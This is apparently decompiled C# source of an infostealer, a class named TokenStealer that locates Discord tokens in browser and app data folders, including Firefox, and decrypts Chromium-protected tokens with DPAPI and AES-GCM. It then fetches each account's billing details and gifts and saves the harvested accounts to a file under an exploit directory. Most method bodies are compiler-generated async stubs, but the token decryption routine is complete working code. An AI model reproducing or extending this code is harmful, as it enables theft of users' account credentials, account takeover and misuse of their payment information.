﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000040 RID: 64
	internal class TokenStealer
	{
		// Token: 0x0600012E RID: 302 RVA: 0x000068C8 File Offset: 0x00004AC8
		static TokenStealer()
		{
			TokenStealer.Client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
			TokenStealer.Client.DefaultRequestHeaders.UserAgent.ParseAdd("Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");
			TokenStealer._accounts = new List<DiscordAccountFormat>();
			TokenStealer.AccountsFilePath = Path.Combine(Help.ExploitDir, "Discord", "Accounts.txt");
		}

		// Token: 0x0600012F RID: 303 RVA: 0x00006954 File Offset: 0x00004B54
		internal static Task<DiscordAccountFormat[]> GetAccounts()
		{
			TokenStealer.<GetAccounts>d__7 <GetAccounts>d__;
			<GetAccounts>d__.<>t__builder = AsyncTaskMethodBuilder<DiscordAccountFormat[]>.Create();
			<GetAccounts>d__.<>1__state = -1;
			<GetAccounts>d__.<>t__builder.Start<TokenStealer.<GetAccounts>d__7>(ref <GetAccounts>d__);
			return <GetAccounts>d__.<>t__builder.Task;
		}

		// Token: 0x06000130 RID: 304 RVA: 0x00006990 File Offset: 0x00004B90
		private static Task Run()
		{
			TokenStealer.<Run>d__8 <Run>d__;
			<Run>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<Run>d__.<>1__state = -1;
			<Run>d__.<>t__builder.Start<TokenStealer.<Run>d__8>(ref <Run>d__);
			return <Run>d__.<>t__builder.Task;
		}

		// Token: 0x06000131 RID: 305 RVA: 0x000069CC File Offset: 0x00004BCC
		private static Task WriteAccountsToFile()
		{
			TokenStealer.<WriteAccountsToFile>d__9 <WriteAccountsToFile>d__;
			<WriteAccountsToFile>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<WriteAccountsToFile>d__.<>1__state = -1;
			<WriteAccountsToFile>d__.<>t__builder.Start<TokenStealer.<WriteAccountsToFile>d__9>(ref <WriteAccountsToFile>d__);
			return <WriteAccountsToFile>d__.<>t__builder.Task;
		}

		// Token: 0x06000132 RID: 306 RVA: 0x00006A08 File Offset: 0x00004C08
		private static Task MethodA(string path)
		{
			TokenStealer.<MethodA>d__10 <MethodA>d__;
			<MethodA>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<MethodA>d__.path = path;
			<MethodA>d__.<>1__state = -1;
			<MethodA>d__.<>t__builder.Start<TokenStealer.<MethodA>d__10>(ref <MethodA>d__);
			return <MethodA>d__.<>t__builder.Task;
		}

		// Token: 0x06000133 RID: 307 RVA: 0x00006A4C File Offset: 0x00004C4C
		private static Task MethodB(string path)
		{
			TokenStealer.<MethodB>d__11 <MethodB>d__;
			<MethodB>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<MethodB>d__.path = path;
			<MethodB>d__.<>1__state = -1;
			<MethodB>d__.<>t__builder.Start<TokenStealer.<MethodB>d__11>(ref <MethodB>d__);
			return <MethodB>d__.<>t__builder.Task;
		}

		// Token: 0x06000134 RID: 308 RVA: 0x00006A90 File Offset: 0x00004C90
		private static Task FireFoxMethod(string path)
		{
			TokenStealer.<FireFoxMethod>d__12 <FireFoxMethod>d__;
			<FireFoxMethod>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<FireFoxMethod>d__.path = path;
			<FireFoxMethod>d__.<>1__state = -1;
			<FireFoxMethod>d__.<>t__builder.Start<TokenStealer.<FireFoxMethod>d__12>(ref <FireFoxMethod>d__);
			return <FireFoxMethod>d__.<>t__builder.Task;
		}

		// Token: 0x06000135 RID: 309 RVA: 0x00006AD4 File Offset: 0x00004CD4
		private static string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
		{
			string result;
			try
			{
				byte[] array = buffer.Skip(15).ToArray<byte>();
				byte[] key = ProtectedData.Unprotect(protectedKey, null, DataProtectionScope.CurrentUser);
				byte[] iv = buffer.Skip(3).Take(12).ToArray<byte>();
				byte[] array2 = array.Skip(array.Length - 16).ToArray<byte>();
				array = array.Take(array.Length - array2.Length).ToArray<byte>();
				byte[] bytes = new AesGcm().Decrypt(key, iv, null, array, array2);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000136 RID: 310 RVA: 0x00006B74 File Offset: 0x00004D74
		private static Task<string[]> GetBilling(string token)
		{
			TokenStealer.<GetBilling>d__14 <GetBilling>d__;
			<GetBilling>d__.<>t__builder = AsyncTaskMethodBuilder<string[]>.Create();
			<GetBilling>d__.token = token;
			<GetBilling>d__.<>1__state = -1;
			<GetBilling>d__.<>t__builder.Start<TokenStealer.<GetBilling>d__14>(ref <GetBilling>d__);
			return <GetBilling>d__.<>t__builder.Task;
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00006BB8 File Offset: 0x00004DB8
		private static Task<GiftFormat[]> GetGifts(string token)
		{
			TokenStealer.<GetGifts>d__15 <GetGifts>d__;
			<GetGifts>d__.<>t__builder = AsyncTaskMethodBuilder<GiftFormat[]>.Create();
			<GetGifts>d__.token = token;
			<GetGifts>d__.<>1__state = -1;
			<GetGifts>d__.<>t__builder.Start<TokenStealer.<GetGifts>d__15>(ref <GetGifts>d__);
			return <GetGifts>d__.<>t__builder.Task;
		}

		// Token: 0x06000138 RID: 312 RVA: 0x00006BFC File Offset: 0x00004DFC
		private static Task AddAccount(string token)
		{
			TokenStealer.<AddAccount>d__16 <AddAccount>d__;
			<AddAccount>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<AddAccount>d__.token = token;
			<AddAccount>d__.<>1__state = -1;
			<AddAccount>d__.<>t__builder.Start<TokenStealer.<AddAccount>d__16>(ref <AddAccount>d__);
			return <AddAccount>d__.<>t__builder.Task;
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00006C40 File Offset: 0x00004E40
		private static void RemoveDuplicates()
		{
			TokenStealer._accounts = (from t in TokenStealer._accounts
			group t by t.Token into t
			select t.First<DiscordAccountFormat>()).ToList<DiscordAccountFormat>();
		}

		// Token: 0x040000A3 RID: 163
		private static readonly string RoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x040000A4 RID: 164
		private static readonly string LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x040000A5 RID: 165
		private static readonly HttpClient Client = new HttpClient();

		// Token: 0x040000A6 RID: 166
		private static List<DiscordAccountFormat> _accounts;

		// Token: 0x040000A7 RID: 167
		private static List<GiftFormat> _gifts;

		// Token: 0x040000A8 RID: 168
		private static readonly string AccountsFilePath;
	}
}
